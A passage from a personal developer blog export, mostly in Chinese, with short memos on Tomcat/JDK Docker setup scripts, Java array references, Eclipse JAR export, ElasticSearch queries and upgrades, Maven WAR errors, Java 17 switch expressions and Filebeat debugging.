<h3 id="env-sh-content"><a href="#env-sh-content" class="headerlink" title="env.sh content"></a>env.sh content</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">read</span> total_Memory &lt;&lt;&lt; $(free -h | grep Mem | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | <span class="built_in">tr</span> -d <span class="string">&#x27;Gi&#x27;</span>)</span><br><span class="line"><span class="built_in">read</span> cgroup_Memory &lt;&lt;&lt; $(<span class="built_in">cat</span> /sys/fs/cgroup/memory/memory.limit_in_bytes)</span><br><span class="line">cgroup_Memory=$((<span class="variable">$cgroup_Memory</span>/<span class="number">1024</span>/<span class="number">1024</span>/<span class="number">1024</span>))</span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$cgroup_Memory</span> -le <span class="variable">$total_Memory</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    total_Memory=<span class="variable">$cgroup_Memory</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$total_Memory</span>&quot;</span> -le 64 ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    proportion=0.6</span><br><span class="line">    tomcat_Memory=`awk -v x=<span class="variable">$total_Memory</span> -v y=<span class="variable">$proportion</span> <span class="string">&#x27;BEGIN &#123;printf int(x*y)&#125;&#x27;</span>`</span><br><span class="line"><span class="keyword">elif</span> [ <span class="string">&quot;<span class="variable">$total_Memory</span>&quot;</span> -gt 64 ] &amp;&amp; [ <span class="string">&quot;<span class="variable">$total_Memory</span>&quot;</span> -le 128 ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    proportion=0.5</span><br><span class="line">    tomcat_Memory=`awk -v x=<span class="variable">$total_Memory</span> -v y=<span class="variable">$proportion</span> <span class="string">&#x27;BEGIN &#123;printf int(x*y)&#125;&#x27;</span>`</span><br><span class="line"><span class="keyword">elif</span> [ <span class="string">&quot;<span class="variable">$total_Memory</span>&quot;</span> -gt 128 ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    tomcat_Memory=64</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;can&#x27;t get system total memory&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$tomcat_Memory</span> -eq 0 ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    tomcat_Memory=1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">export</span> XMX=<span class="variable">$tomcat_Memory</span></span><br><span class="line"><span class="built_in">export</span> XMS=<span class="variable">$tomcat_Memory</span></span><br></pre></td></tr></table></figure>

<h3 id="run-sh-content"><a href="#run-sh-content" class="headerlink" title="run.sh content"></a>run.sh content</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">mkdir</span> ./tomcat10 &amp;&amp; tar -zxvf tomcat10.tar.gz -C ./tomcat10 --strip-components 1</span><br><span class="line"><span class="built_in">mkdir</span> ./jdk17 &amp;&amp; tar -zxvf jdk17.tar.gz -C ./jdk17 --strip-components 1</span><br><span class="line"><span class="built_in">ln</span> -s /jdk17 /java</span><br><span class="line"><span class="built_in">ln</span> -s /tomcat10 /usr/local/tomcat</span><br><span class="line"><span class="built_in">rm</span> -f /jdk17.tar.gz</span><br><span class="line"><span class="built_in">rm</span> -f /tomcat10.tar.gz</span><br><span class="line"><span class="built_in">rm</span> -rf /usr/local/tomcat/work</span><br><span class="line"><span class="built_in">rm</span> -rf /usr/local/tomcat/webapps</span><br><span class="line">yum install -y fontconfig</span><br><span class="line">yum install -y procps-ng</span><br><span class="line">fc-cache --force</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Double Array Call By Reference Issue</title>
    <url>/posts/eb32ac48/</url>
    <content><![CDATA[<h2 id="Intro-Double-Array-Call-By-Reference-Issue"><a href="#Intro-Double-Array-Call-By-Reference-Issue" class="headerlink" title="Intro Double Array Call By Reference Issue"></a>Intro Double Array Call By Reference Issue</h2><span id="more"></span>
<p>這篇介紹Double Array Call By Reference Issue。</p>
<h2 id="Example"><a href="#Example" class="headerlink" title="Example:"></a>Example:</h2><p>double [] a &#x3D; new double[3];<br>Arrays.fill(a, 0);</p>
<p>double [] b &#x3D; a;<br>for (int i &#x3D; 0; i &lt; 3; i++) {<br>    a[i] &#x3D; i;<br>    System.out.println(b[i]);<br>}</p>
<p>因call-by-reference特性，array a的值改變相對應array b的值也會跟著array a的值改變。<br>而不是array b的值都是 0。</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Array</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Eclipse Export JAR</title>
    <url>/posts/24258de7/</url>
    <content><![CDATA[<h3 id="Intro-Eclipse-Export-JAR"><a href="#Intro-Eclipse-Export-JAR" class="headerlink" title="Intro Eclipse Export JAR"></a>Intro Eclipse Export JAR</h3><span id="more"></span>
<p>這篇介紹在Eclipse Export JAR步驟。</p>
<h3 id="步驟"><a href="#步驟" class="headerlink" title="步驟"></a>步驟</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">對專案按右鍵 -&gt; Export -&gt; Export -&gt; Java -&gt; JAR file -&gt; Next</span><br></pre></td></tr></table></figure>

<h3 id="JAR-Export"><a href="#JAR-Export" class="headerlink" title="JAR Export"></a>JAR Export</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1.Select the <span class="built_in">export</span> destination:</span><br><span class="line">JAR file:(填要輸出的路徑跟JAR檔名) -&gt; Next -&gt; Next</span><br><span class="line">2.第一次先點選 Generate the manifest file</span><br><span class="line">Save the manifest <span class="keyword">in</span> the workspace (點選</span><br><span class="line">Manifest file: /專案名/MANIFEST.MF -&gt; Finish</span><br><span class="line">3.編輯好MANIFEST.MF</span><br><span class="line">往後點選 Use existing manifest from workspace:</span><br><span class="line">Manifest file: /專案名/MANIFEST.MF -&gt; Finish</span><br></pre></td></tr></table></figure>

<h3 id="編輯MANIFEST-MF"><a href="#編輯MANIFEST-MF" class="headerlink" title="編輯MANIFEST.MF"></a>編輯MANIFEST.MF</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">path:META-INF/MANIFEST.MF</span><br><span class="line">file example:</span><br><span class="line">Manifest-Version: 1.0</span><br><span class="line">Class-Path: javax.servlet-api-3.1.0.jar mockito-all-1.9.5.jar slf4j-ap</span><br><span class="line"> i-1.7.24.jar log4j-slf4j-impl-2.8.2.jar log4j-api-2.8.2.jar log4j-cor</span><br><span class="line"> e-2.8.2.jar ip2locationNew-1.0.0.jar wiremock-jre8-2.25.1.jar guava-2</span><br><span class="line"> 7.0.1-jre.jar jetty-server-9.4.20.v20190813.jar jetty-http-9.4.20.v20</span><br><span class="line"> 190813.jar jetty-io-9.4.20.v20190813.jar jetty-servlet-9.4.20.v201908</span><br><span class="line"> 13.jar jetty-security-9.4.20.v20190813.jar jetty-servlets-9.4.20.v201</span><br><span class="line"> 90813.jar jetty-continuation-9.4.20.v20190813.jar jetty-util-9.4.20.v</span><br><span class="line"> 20190813.jar jetty-webapp-9.4.20.v20190813.jar jetty-xml-9.4.20.v2019</span><br><span class="line"> 0813.jar xmlunit-legacy-2.6.2.jar httpcore-4.4.6.jar httpclient-4.5.3</span><br><span class="line"> .jar commons-logging-1.1.1.jar commons-lang3-3.4.jar </span><br><span class="line">Main-Class: com.AppInit</span><br><span class="line"></span><br><span class="line">memo:</span><br><span class="line">Class-Path每行有長度限制&amp;注意空格</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Eclipse</category>
      </categories>
      <tags>
        <tag>Eclipse</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Eclipse ResourceBundle Editor</title>
    <url>/posts/bb2cae78/</url>
    <content><![CDATA[<h3 id="Intro-Eclipse-ResourceBundle-Editor"><a href="#Intro-Eclipse-ResourceBundle-Editor" class="headerlink" title="Intro Eclipse ResourceBundle Editor"></a>Intro Eclipse ResourceBundle Editor</h3><span id="more"></span>
<p>這篇介紹Eclipse ResourceBundle Editor。</p>
<h3 id="下載plugin"><a href="#下載plugin" class="headerlink" title="下載plugin"></a>下載plugin</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Eclipse IDE -&gt; Help -&gt; Eclipse Marketplace -&gt; Find -&gt; 輸入ResourceBundle Editor -&gt; Install</span><br></pre></td></tr></table></figure>

<h3 id="語系檔-properties"><a href="#語系檔-properties" class="headerlink" title="語系檔.properties"></a>語系檔.properties</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">針對語系檔.properties -&gt; 右鍵 -&gt; Open With -&gt; 資源文件編輯器 -&gt; 各語系貼上可直接轉unicode</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Eclipse</category>
      </categories>
      <tags>
        <tag>Eclipse</tag>
        <tag>plugin</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Eclipse The Archive Which Is Referenced By The Classpath Does Not Exist</title>
    <url>/posts/449ec514/</url>
    <content><![CDATA[<h3 id="Intro-Eclipse-The-Archive-Which-Is-Referenced-By-The-Classpath-Does-Not-Exist"><a href="#Intro-Eclipse-The-Archive-Which-Is-Referenced-By-The-Classpath-Does-Not-Exist" class="headerlink" title="Intro Eclipse The Archive Which Is Referenced By The Classpath Does Not Exist"></a>Intro Eclipse The Archive Which Is Referenced By The Classpath Does Not Exist</h3><span id="more"></span>
<p>這篇介紹Eclipse The Archive Which Is Referenced By The Classpath Does Not Exist。</p>
<h3 id="Step-by-step"><a href="#Step-by-step" class="headerlink" title="Step by step"></a>Step by step</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">將紅字遺失的jar檔移除</span><br><span class="line"></span><br><span class="line">Project -&gt; Properties -&gt; Java Build Path -&gt; Libraries -&gt; 選擇遺失的jar -&gt; Remove</span><br><span class="line"></span><br><span class="line">重新Run Junit Test即可!</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Eclipse</category>
      </categories>
      <tags>
        <tag>Eclipse</tag>
        <tag>Jre</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro ElasticSearch RangeQuery And TermsQuery</title>
    <url>/posts/952bf78f/</url>
    <content><![CDATA[<h3 id="Intro-ElasticSearch-RangeQuery-And-TermsQuery"><a href="#Intro-ElasticSearch-RangeQuery-And-TermsQuery" class="headerlink" title="Intro ElasticSearch RangeQuery And TermsQuery"></a>Intro ElasticSearch RangeQuery And TermsQuery</h3><span id="more"></span>
<p>這篇介紹ElasticSearch RangeQuery And TermsQuery。</p>
<h3 id="查時間區間-example"><a href="#查時間區間-example" class="headerlink" title="查時間區間 example"></a>查時間區間 example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">KQL:</span><br><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;bool&quot;</span>: &#123;</span><br><span class="line">		<span class="string">&quot;filter&quot;</span>: [</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="string">&quot;range&quot;</span>: &#123;</span><br><span class="line">					<span class="string">&quot;dailydate&quot;</span>: &#123;</span><br><span class="line">					<span class="string">&quot;from&quot;</span>: <span class="string">&quot;2021-08-01 00:00:00&quot;</span>,</span><br><span class="line">					<span class="string">&quot;to&quot;</span>: <span class="string">&quot;2021-08-01 23:59:59&quot;</span>,</span><br><span class="line">					<span class="string">&quot;include_lower&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">					<span class="string">&quot;include_upper&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">					<span class="string">&quot;format&quot;</span>: <span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span></span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		]</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">---</span><br><span class="line">RestHighLevelApi:</span><br><span class="line">SearchSourceBuilder sourceBuilder = new SearchSourceBuilder();</span><br><span class="line">BoolQueryBuilder queryBuilder = QueryBuilders.boolQuery();</span><br><span class="line">queryBuilder.filter(QueryBuilders.rangeQuery(<span class="string">&quot;dailydate&quot;</span>)</span><br><span class="line">	.format(FormatUtils.DATE_PATTERN_DASH_YYYY_MM_DD_BALNK_HH_MM_SS).from(startTime, <span class="literal">true</span>).to(endTime, <span class="literal">true</span>));</span><br><span class="line">sourceBuilder.query(queryBuilder);</span><br></pre></td></tr></table></figure>

<h3 id="查單一欄位-example"><a href="#查單一欄位-example" class="headerlink" title="查單一欄位 example"></a>查單一欄位 example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">KQL:</span><br><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;bool&quot;</span>: &#123;</span><br><span class="line">		<span class="string">&quot;must&quot;</span>: &#123;</span><br><span class="line">			<span class="string">&quot;term&quot;</span>: &#123;</span><br><span class="line">				<span class="string">&quot;userId&quot;</span>: <span class="string">&quot;Mike&quot;</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">---</span><br><span class="line">RestHighLevelApi:</span><br><span class="line">SearchSourceBuilder sourceBuilder = new SearchSourceBuilder();</span><br><span class="line">BoolQueryBuilder queryBuilder = QueryBuilders.boolQuery();</span><br><span class="line">queryBuilder.must(QueryBuilders.termQuery(<span class="string">&quot;userId&quot;</span>, <span class="string">&quot;Mike&quot;</span>));</span><br><span class="line">sourceBuilder.query(queryBuilder);</span><br></pre></td></tr></table></figure>

<h3 id="查多個欄位-OR-example"><a href="#查多個欄位-OR-example" class="headerlink" title="查多個欄位(OR) example"></a>查多個欄位(OR) example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">KQL:</span><br><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;bool&quot;</span>: &#123;</span><br><span class="line">		<span class="string">&quot;should&quot;</span>: [</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="string">&quot;term&quot;</span>: &#123;</span><br><span class="line">				<span class="string">&quot;status&quot;</span>: 1</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;,</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="string">&quot;term&quot;</span>: &#123;</span><br><span class="line">				<span class="string">&quot;status&quot;</span>: 0</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		]</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">---</span><br><span class="line">RestHighLevelApi:</span><br><span class="line">SearchSourceBuilder sourceBuilder = new SearchSourceBuilder();</span><br><span class="line">BoolQueryBuilder queryBuilder = QueryBuilders.boolQuery();</span><br><span class="line">queryBuilder.should(QueryBuilders.termQuery(<span class="string">&quot;status&quot;</span>, 1));</span><br><span class="line">queryBuilder.should(QueryBuilders.termQuery(<span class="string">&quot;status&quot;</span>, 0));</span><br><span class="line">sourceBuilder.query(queryBuilder);</span><br></pre></td></tr></table></figure>

<h3 id="查單個欄位-gt-x3D-and-lt-x3D-example"><a href="#查單個欄位-gt-x3D-and-lt-x3D-example" class="headerlink" title="查單個欄位(&gt;&#x3D; and &lt;&#x3D;) example"></a>查單個欄位(&gt;&#x3D; and &lt;&#x3D;) example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">KQL:</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;bool&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;range&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;score&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;gte&quot;</span>: 10, </span><br><span class="line">        <span class="string">&quot;lte&quot;</span>: 20</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">RestHighLevelApi:</span><br><span class="line">SearchSourceBuilder sourceBuilder = new SearchSourceBuilder();</span><br><span class="line">BoolQueryBuilder queryBuilder = QueryBuilders.boolQuery();</span><br><span class="line">queryBuilder.filter(QueryBuilders.rangeQuery(<span class="string">&quot;score&quot;</span>).gte(10));</span><br><span class="line">queryBuilder.filter(QueryBuilders.rangeQuery(<span class="string">&quot;score&quot;</span>).lte(20));</span><br><span class="line">sourceBuilder.query(queryBuilder);</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>ElasticSearch</category>
      </categories>
      <tags>
        <tag>ElasticSearch</tag>
        <tag>RestHighLevelApi</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro ElasticSearch Aggregation</title>
    <url>/posts/49f166c/</url>
    <content><![CDATA[<h2 id="Intro-ElasticSearch-Aggregation"><a href="#Intro-ElasticSearch-Aggregation" class="headerlink" title="Intro ElasticSearch Aggregation"></a>Intro ElasticSearch Aggregation</h2><span id="more"></span>
<p>這篇介紹ElasticSearch Aggregation。</p>
<p>該文章介紹如何下KQL的Sum field + Group by field<br>來實作簡單的ElasticSearch Aggregation查詢!<br>範例及Output如下:</p>
<h2 id="如何在ElasticSearch做Sum-Group-By"><a href="#如何在ElasticSearch做Sum-Group-By" class="headerlink" title="如何在ElasticSearch做Sum Group By:"></a>如何在ElasticSearch做Sum Group By:</h2><p>KQL exmaple:<br>GET {index}-*&#x2F;_search?size&#x3D;0<br>{<br>    “size”: 0,<br>    “aggs”: {<br>        “groupByField”: {<br>            “terms”: {<br>            “field”: “employee”<br>        },<br>    “aggs”: {<br>        “summarySalary”: {<br>            “sum”: {<br>            “field”: “salary”<br>        }<br>    }<br>}<br>}<br>}<br>}</p>
<h2 id="Output"><a href="#Output" class="headerlink" title="Output:"></a>Output:</h2><p>{<br>  “took” : 19,<br>  “timed_out” : false,<br>  “_shards” : {<br>    “total” : 1,<br>    “successful” : 1,<br>    “skipped” : 0,<br>    “failed” : 0<br>  },<br>  “hits” : {<br>    “total” : {<br>      “value” : 10000,<br>      “relation” : “gte”<br>    },<br>    “max_score” : null,<br>    “hits” : [ ]<br>  },<br>  “aggregations” : {<br>    “groupByField” : {<br>      “doc_count_error_upper_bound” : -1,<br>      “sum_other_doc_count” : 3,<br>      “buckets” : [<br>        {<br>          “key” : “Mark”,<br>          “doc_count” : 2,<br>          “summarySalary” : {<br>            “value” : 1124<br>          }<br>        },<br>        {<br>          “key” : “Mary”,<br>          “doc_count” : 1,<br>          “summarySalary” : {<br>            “value” : 2574<br>          }<br>        },<br>      ]<br>    }<br>  }<br>}</p>
]]></content>
      <categories>
        <category>ElasticSearch</category>
      </categories>
      <tags>
        <tag>ElasticSearch</tag>
        <tag>Aggregation</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro ElasticSearch Stored TimeZone</title>
    <url>/posts/d5b21083/</url>
    <content><![CDATA[<h3 id="Intro-ElasticSearch-Stored-TimeZone"><a href="#Intro-ElasticSearch-Stored-TimeZone" class="headerlink" title="Intro ElasticSearch Stored TimeZone"></a>Intro ElasticSearch Stored TimeZone</h3><span id="more"></span>
<p>這篇介紹ElasticSearch Stored TimeZone。</p>
<h3 id="關於時區"><a href="#關於時區" class="headerlink" title="關於時區"></a>關於時區</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在ElasticSearch的世界裡，儲存的時區都是以UTC+0為主。</span><br><span class="line">若系統預設時區是GMT+8，要使用RestHighLevelApi去ElasticSearch查詢</span><br><span class="line">必須將時間欄位從GMT+8時區轉換成UTC+0才能正確查詢。</span><br><span class="line"></span><br><span class="line">在ElasticSearch的index也是用UTC+0時區建立。</span><br></pre></td></tr></table></figure>

<h3 id="例外"><a href="#例外" class="headerlink" title="例外"></a>例外</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在Kibana上，下KQL因Kibana預設時區是GMT+8。</span><br><span class="line">所以不用再特地將時間從GMT+8轉換成UTC+0。</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ElasticSearch</category>
      </categories>
      <tags>
        <tag>ElasticSearch</tag>
        <tag>Kibana</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Error Assembling WAR webxml attribute is required</title>
    <url>/posts/a203377e/</url>
    <content><![CDATA[<h3 id="Intro-Error-Assembling-WAR-webxml-attribute-is-required"><a href="#Intro-Error-Assembling-WAR-webxml-attribute-is-required" class="headerlink" title="Intro Error Assembling WAR webxml attribute is required"></a>Intro Error Assembling WAR webxml attribute is required</h3><span id="more"></span>
<p>這篇介紹Error Assembling WAR webxml attribute is required。</p>
<h3 id="錯誤訊息-amp-原因"><a href="#錯誤訊息-amp-原因" class="headerlink" title="錯誤訊息 &amp; 原因"></a>錯誤訊息 &amp; 原因</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[ERROR] Failed to execute goal org.apache.maven.plugins:maven-war-plugin:3.1.0:war (default-war) </span><br><span class="line">on project xxx: Error assembling WAR: webxml attribute is required </span><br><span class="line">(or pre-existing WEB-INF/web.xml <span class="keyword">if</span> executing <span class="keyword">in</span> update mode) -&gt; [Help 1]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pom.xml設定:</span><br><span class="line">&lt;executions&gt;</span><br><span class="line">	&lt;execution&gt;</span><br><span class="line">		&lt;<span class="built_in">id</span>&gt;default-war&lt;/id&gt;</span><br><span class="line">		&lt;configuration&gt;</span><br><span class="line">			&lt;webResources&gt;</span><br><span class="line">				&lt;resource&gt;</span><br><span class="line">					&lt;directory&gt;src/main/config/prod&lt;/directory&gt;</span><br><span class="line">					&lt;targetPath&gt;WEB-INF&lt;/targetPath&gt;</span><br><span class="line">					&lt;includes&gt;</span><br><span class="line">						&lt;include&gt;web.xml&lt;/include&gt;</span><br><span class="line">					&lt;/includes&gt;</span><br><span class="line">				&lt;/resource&gt;</span><br><span class="line">			</span><br><span class="line">因缺少src/main/config/prod該路徑的web.xml檔案造成compiler error。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Maven</category>
      </categories>
      <tags>
        <tag>Maven</tag>
        <tag>Compiler</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro ElasticSearch Upgrade From 7.3.2 To 7.17.3 Memo</title>
    <url>/posts/6eae8115/</url>
    <content><![CDATA[<h3 id="Intro-ElasticSearch-Upgrade-From-7-3-2-To-7-17-3-Memo"><a href="#Intro-ElasticSearch-Upgrade-From-7-3-2-To-7-17-3-Memo" class="headerlink" title="Intro ElasticSearch Upgrade From 7.3.2 To 7.17.3 Memo"></a>Intro ElasticSearch Upgrade From 7.3.2 To 7.17.3 Memo</h3><span id="more"></span>
<p>這篇介紹ElasticSearch Upgrade From 7.3.2 To 7.17.3 Memo.</p>
<h3 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ElasticSearch server版本升級從7.3.2 to 7.17.3</span><br><span class="line"></span><br><span class="line">Server需安裝7.17.3</span><br><span class="line"></span><br><span class="line">Client:</span><br><span class="line">pom.xml</span><br><span class="line"></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;org.elasticsearch&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;elasticsearch&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;7.17.3&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;org.elasticsearch.client&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;elasticsearch-rest-high-level-client&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;7.17.3&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<h3 id="相關程式異動"><a href="#相關程式異動" class="headerlink" title="相關程式異動"></a>相關程式異動</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">- import org.elasticsearch.common.unit.TimeValue;</span><br><span class="line">切換</span><br><span class="line">+ import org.elasticsearch.core.TimeValue;</span><br><span class="line"></span><br><span class="line">在catalina.out會出現</span><br><span class="line">2022-05-23 10:51:48,551 WARN [org.elasticsearch.client.RestClient] </span><br><span class="line">- request [POST http://&#123;aaa&#125;/&#123;bbb&#125;/_search?</span><br><span class="line">typed_keys=<span class="literal">true</span>&amp;max_concurrent_shard_requests=5&amp;</span><br><span class="line">ignore_unavailable=<span class="literal">true</span>&amp;expand_wildcards=open%2Cclosed</span><br><span class="line">&amp;allow_no_indices=<span class="literal">true</span>&amp;ignore_throttled=<span class="literal">false</span>&amp;</span><br><span class="line">search_type=query_then_fetch&amp;batched_reduce_size=512] </span><br><span class="line">returned 1 warnings: [299 Elasticsearch-7.17.3-5ad023604c8d7416c9eb6c0eadb62b14e766caff </span><br><span class="line"><span class="string">&quot;[ignore_throttled] parameter is deprecated because frozen indices have been deprecated.</span></span><br><span class="line"><span class="string">Consider cold or frozen tiers in place of frozen indices.&quot;</span>]</span><br><span class="line"></span><br><span class="line">需調整indicesOptions參數</span><br><span class="line">原本使用:</span><br><span class="line">SearchRequest searchRequest = new SearchRequest(indexName)</span><br><span class="line">.indicesOptions(IndicesOptions.LENIENT_EXPAND_OPEN_CLOSED);</span><br><span class="line">切換使用:</span><br><span class="line">SearchRequest searchRequest = new SearchRequest(indexName)</span><br><span class="line">.indicesOptions(</span><br><span class="line">	IndicesOptions.fromOptions(<span class="literal">true</span>, <span class="literal">true</span>, <span class="literal">true</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">true</span>));</span><br><span class="line">最後一個參數 <span class="literal">true</span> -&gt; 不查詢frozen index -&gt; 不會出現WARM <span class="built_in">log</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>ElasticSearch</category>
      </categories>
      <tags>
        <tag>ElasticSearch</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Extended Switch Expressions</title>
    <url>/posts/41ce10ea/</url>
    <content><![CDATA[<h3 id="Intro-Extended-Switch-Expressions"><a href="#Intro-Extended-Switch-Expressions" class="headerlink" title="Intro Extended Switch Expressions"></a>Intro Extended Switch Expressions</h3><span id="more"></span>
<p>這篇介紹Extended Switch Expressions。</p>
<h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Java17的switch可以接收回傳值並不需使用<span class="built_in">break</span>來增加可讀性。</span><br><span class="line"></span><br><span class="line">DayOfWeek dayOfWeek = LocalDate.now().getDayOfWeek();</span><br><span class="line">boolean freeDay = switch (dayOfWeek) &#123;</span><br><span class="line">    <span class="keyword">case</span> MONDAY, TUESDAY, WEDNESDAY, THURSDAY, FRIDAY -&gt; <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">case</span> SATURDAY, SUNDAY -&gt; <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">允許使用yield回傳值，且使用一個<span class="keyword">function</span>來執行其它程式碼語法。</span><br><span class="line"></span><br><span class="line">DayOfWeek dayOfWeek = LocalDate.now().getDayOfWeek();</span><br><span class="line">boolean freeDay = switch (dayOfWeek) &#123;</span><br><span class="line">    <span class="keyword">case</span> MONDAY, TUESDAY, WEDNESDAY, THURSDAY, FRIDAY -&gt; &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Work work work&quot;</span>);</span><br><span class="line">      yield <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> SATURDAY, SUNDAY -&gt; &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Yey, a free day!&quot;</span>);</span><br><span class="line">      yield <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java17</category>
      </categories>
      <tags>
        <tag>Java17</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Filebeat Debug Mode</title>
    <url>/posts/2d22cbd/</url>
    <content><![CDATA[<h3 id="Intro-Filebeat-Debug-Mode"><a href="#Intro-Filebeat-Debug-Mode" class="headerlink" title="Intro Filebeat Debug Mode"></a>Intro Filebeat Debug Mode</h3><span id="more"></span>
<p>這篇介紹Filebeat Debug Mode。</p>
<h3 id="Filebeat-Debug-Mode"><a href="#Filebeat-Debug-Mode" class="headerlink" title="Filebeat Debug Mode"></a>Filebeat Debug Mode</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ./filebeat -c CustomConfig/filebeat.yml -e -d <span class="string">&quot;*&quot;</span></span><br><span class="line"></span><br><span class="line">執行會一直跑代表正常</span><br><span class="line">若跑有停下來就是發生錯誤的地方</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Filebeat</category>
      </categories>
      <tags>
        <tag>Filebeat</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Filebeat Memo Records</title>
    <url>/posts/773d9b5/</url>
    <content><![CDATA[<h2 id="Intro-Filebeat-Memo-Records"><a href="#Intro-Filebeat-Memo-Records" class="headerlink" title="Intro Filebeat Memo Records"></a>Intro Filebeat Memo Records</h2><span id="more"></span>
<p>這篇介紹Filebeat Memo Records.</p>
<h2 id="Filebeat-Memo-Records"><a href="#Filebeat-Memo-Records" class="headerlink" title="Filebeat Memo Records:"></a>Filebeat Memo Records:</h2><p>有兩種情形會造成Filebeat重推log<br>1.Amazon Web Service的EBS從GP2升級GP3，底層Server有可能是全新雲端主機<br>2.將log使用mv搬移至不同位置</p>
